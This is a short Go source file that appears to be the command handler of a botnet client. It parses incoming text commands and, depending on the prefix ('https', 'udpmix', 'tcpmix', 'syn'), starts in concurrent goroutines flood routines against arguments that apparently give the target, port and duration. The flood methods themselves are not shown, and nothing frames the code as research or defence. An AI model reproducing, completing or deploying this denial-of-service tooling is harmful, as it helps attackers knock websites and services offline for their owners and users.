package main

import (
	"fmt"
	"homo/client/methods"
	"strings"
)

func CommandHandler(command string) {
	commandd := strings.ReplaceAll(string(command), "\n", "")

	fmt.Println(commandd)

	if strings.HasPrefix(commandd, "https") {

		args := strings.Split(commandd, " ")

		go methods.HttpsDefault(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "udpmix") {
		args := strings.Split(commandd, " ")

		go methods.Udp(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "tcpmix") {
		args := strings.Split(commandd, " ")

		go methods.Tcp(args[1], args[2], args[3])
	}
	if strings.HasPrefix(commandd, "syn") {
		args := strings.Split(commandd, " ")

		go methods.Syn(args[1], args[2], args[3])
	}
}
